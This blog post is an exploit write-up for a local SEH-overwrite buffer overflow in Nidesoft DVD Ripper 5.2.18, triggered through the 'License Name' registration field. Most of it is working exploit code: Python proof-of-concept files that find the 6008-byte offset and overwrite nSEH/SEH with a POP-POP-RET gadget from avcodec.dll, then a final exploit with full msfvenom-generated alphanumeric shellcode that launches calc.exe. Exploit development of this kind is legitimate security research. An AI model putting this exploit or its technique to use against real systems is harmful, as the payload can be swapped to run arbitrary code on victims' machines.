---
layout: post
title: Nidesoft DVD Ripper - 5.2.18 Local Buffer Overflow
date: 2020-07-29 14:45:00
categories: posts
comments: false
en: true
---

# The Bug.

### DVD Ripper version 5.2.18 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter "License Name" within the registration in the bootup.

### Initial PoC:

```term
import struct

buffer = "A" * 7000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### The exploit is generated.

![](/assets/img/Findings10/1.png)

### The exploit is copied into the clipboard.

![](/assets/img/Findings10/2.png)

### The application is launched and the payload is sent through the required parameter.

![](/assets/img/Findings10/3.png)

## Crash I.

![](/assets/img/Findings10/4.png)

# Controlling the execution.

### Through the use of msf-pattern*, the offset is found to be at 6008.

### PoC.

```term
import struct

buffer = "A" * 6008 + "BBBB" + "CCCC" 

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### Crash II.

![](/assets/img/Findings10/5.png)

### List of the available modules.

![](/assets/img/Findings10/6.png)

### In this case, i chose avcodec.dll, as it possesses a great quantity of POP-POP-RET sequences. In addition, these were found to be alphanumeric as well.

![](/assets/img/Findings10/7.png)

### PoC.

```term
import struct

nseh = "\x70\x08\x71\x06"
seh = struct.pack("<I", 0x66784C36)

buffer = "A" * 6008 + nseh + seh + "\xff" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### Crash III.

![](/assets/img/Findings10/8.png)

### The jump is seen to fall not within the \xff characters, in order to fix this, the jump is changed on its last byte to be a bit higher, instead of being 06 to 08.

### PoC.

```term
import struct

nseh = "\x70\x08\x71\x08"
seh = struct.pack("<I", 0x66784C36)

buffer = "A" * 6008 + nseh + seh + "\xff" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### Crash IV.

![](/assets/img/Findings10/9.png)

## Generating Shellcode.

```term
root@whitecr0wz:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 447 (iteration=0)
x86/alpha_mixed chosen with final size 447
Payload size: 447 bytes
Final size of py file: 2184 bytes
buf =  b""
buf += b"\x89\xe2\xda\xcd\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += b"\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += b"\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x6b\x58\x4b\x32"
buf += b"\x65\x50\x73\x30\x57\x70\x33\x50\x6c\x49\x68\x65\x35"
buf += b"\x61\x69\x50\x70\x64\x6c\x4b\x30\x50\x46\x50\x4e\x6b"
buf += b"\x73\x62\x36\x6c\x6c\x4b\x61\x42\x34\x54\x4c\x4b\x42"
buf += b"\x52\x46\x48\x54\x4f\x38\x37\x53\x7a\x54\x66\x70\x31"
buf += b"\x79\x6f\x4e\x4c\x37\x4c\x55\x31\x61\x6c\x36\x62\x76"
buf += b"\x4c\x31\x30\x6f\x31\x78\x4f\x44\x4d\x36\x61\x6a\x67"
buf += b"\x49\x72\x6c\x32\x56\x32\x70\x57\x6e\x6b\x61\x42\x76"
buf += b"\x70\x4c\x4b\x30\x4a\x67\x4c\x6c\x4b\x32\x6c\x44\x51"
buf += b"\x33\x48\x49\x73\x30\x48\x33\x31\x68\x51\x42\x71\x4e"
buf += b"\x6b\x31\x49\x37\x50\x36\x61\x6a\x73\x6c\x4b\x63\x79"
buf += b"\x34\x58\x69\x73\x36\x5a\x72\x69\x4c\x4b\x36\x54\x4c"
buf += b"\x4b\x46\x61\x5a\x76\x64\x71\x79\x6f\x6c\x6c\x6f\x31"
buf += b"\x4a\x6f\x66\x6d\x56\x61\x58\x47\x66\x58\x59\x70\x52"
buf += b"\x55\x78\x76\x33\x33\x73\x4d\x69\x68\x57\x4b\x71\x6d"
buf += b"\x55\x74\x54\x35\x78\x64\x72\x78\x6c\x4b\x62\x78\x35"
buf += b"\x74\x37\x71\x4e\x33\x45\x36\x4c\x4b\x64\x4c\x42\x6b"
buf += b"\x6c\x4b\x72\x78\x55\x4c\x63\x31\x79\x43\x6e\x6b\x77"
buf += b"\x74\x4e\x6b\x63\x31\x58\x50\x6d\x59\x30\x44\x31\x34"
buf += b"\x51\x34\x33\x6b\x71\x4b\x33\x51\x62\x79\x30\x5a\x32"
buf += b"\x71\x69\x6f\x4d\x30\x71\x4f\x71\x4f\x70\x5a\x6e\x6b"
buf += b"\x65\x42\x6a\x4b\x6e\x6d\x51\x4d\x42\x4a\x46\x61\x6c"
buf += b"\x4d\x6b\x35\x6c\x72\x33\x30\x73\x30\x37\x70\x50\x50"
buf += b"\x70\x68\x76\x51\x4e\x6b\x42\x4f\x4c\x47\x39\x6f\x39"
buf += b"\x45\x6d\x6b\x39\x70\x65\x4d\x45\x7a\x46\x6a\x43\x58"
buf += b"\x49\x36\x4e\x75\x6f\x4d\x6d\x4d\x59\x6f\x38\x55\x57"
buf += b"\x4c\x57\x76\x43\x4c\x54\x4a\x4f\x70\x79\x6b\x6d\x30"
buf += b"\x51\x65\x44\x45\x6f\x4b\x42\x67\x72\x33\x72\x52\x52"
buf += b"\x4f\x33\x5a\x57\x70\x51\x43\x6b\x4f\x4b\x65\x73\x53"
buf += b"\x61\x71\x30\x6c\x62\x43\x64\x6e\x50\x65\x50\x78\x70"
buf += b"\x65\x75\x50\x41\x41"
```

### Final PoC.

```term
import struct

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
# Payload size: 447 bytes

buf =  b""
buf += b"\x89\xe2\xda\xcd\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += b"\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += b"\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x6b\x58\x4b\x32"
buf += b"\x65\x50\x73\x30\x57\x70\x33\x50\x6c\x49\x68\x65\x35"
buf += b"\x61\x69\x50\x70\x64\x6c\x4b\x30\x50\x46\x50\x4e\x6b"
buf += b"\x73\x62\x36\x6c\x6c\x4b\x61\x42\x34\x54\x4c\x4b\x42"
buf += b"\x52\x46\x48\x54\x4f\x38\x37\x53\x7a\x54\x66\x70\x31"
buf += b"\x79\x6f\x4e\x4c\x37\x4c\x55\x31\x61\x6c\x36\x62\x76"
buf += b"\x4c\x31\x30\x6f\x31\x78\x4f\x44\x4d\x36\x61\x6a\x67"
buf += b"\x49\x72\x6c\x32\x56\x32\x70\x57\x6e\x6b\x61\x42\x76"
buf += b"\x70\x4c\x4b\x30\x4a\x67\x4c\x6c\x4b\x32\x6c\x44\x51"
buf += b"\x33\x48\x49\x73\x30\x48\x33\x31\x68\x51\x42\x71\x4e"
buf += b"\x6b\x31\x49\x37\x50\x36\x61\x6a\x73\x6c\x4b\x63\x79"
buf += b"\x34\x58\x69\x73\x36\x5a\x72\x69\x4c\x4b\x36\x54\x4c"
buf += b"\x4b\x46\x61\x5a\x76\x64\x71\x79\x6f\x6c\x6c\x6f\x31"
buf += b"\x4a\x6f\x66\x6d\x56\x61\x58\x47\x66\x58\x59\x70\x52"
buf += b"\x55\x78\x76\x33\x33\x73\x4d\x69\x68\x57\x4b\x71\x6d"
buf += b"\x55\x74\x54\x35\x78\x64\x72\x78\x6c\x4b\x62\x78\x35"
buf += b"\x74\x37\x71\x4e\x33\x45\x36\x4c\x4b\x64\x4c\x42\x6b"
buf += b"\x6c\x4b\x72\x78\x55\x4c\x63\x31\x79\x43\x6e\x6b\x77"
buf += b"\x74\x4e\x6b\x63\x31\x58\x50\x6d\x59\x30\x44\x31\x34"
buf += b"\x51\x34\x33\x6b\x71\x4b\x33\x51\x62\x79\x30\x5a\x32"
buf += b"\x71\x69\x6f\x4d\x30\x71\x4f\x71\x4f\x70\x5a\x6e\x6b"
buf += b"\x65\x42\x6a\x4b\x6e\x6d\x51\x4d\x42\x4a\x46\x61\x6c"
buf += b"\x4d\x6b\x35\x6c\x72\x33\x30\x73\x30\x37\x70\x50\x50"
buf += b"\x70\x68\x76\x51\x4e\x6b\x42\x4f\x4c\x47\x39\x6f\x39"
buf += b"\x45\x6d\x6b\x39\x70\x65\x4d\x45\x7a\x46\x6a\x43\x58"
buf += b"\x49\x36\x4e\x75\x6f\x4d\x6d\x4d\x59\x6f\x38\x55\x57"
buf += b"\x4c\x57\x76\x43\x4c\x54\x4a\x4f\x70\x79\x6b\x6d\x30"
buf += b"\x51\x65\x44\x45\x6f\x4b\x42\x67\x72\x33\x72\x52\x52"
buf += b"\x4f\x33\x5a\x57\x70\x51\x43\x6b\x4f\x4b\x65\x73\x53"
buf += b"\x61\x71\x30\x6c\x62\x43\x64\x6e\x50\x65\x50\x78\x70"
buf += b"\x65\x75\x50\x41\x41"

nseh = "\x70\x08\x71\x08"
seh = struct.pack("<I", 0x66784C36)

buffer = "A" * 6008 + nseh + seh + "A" * 5 + buf + "\xff" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

# EndGame.

![](/assets/img/Findings10/10.gif)
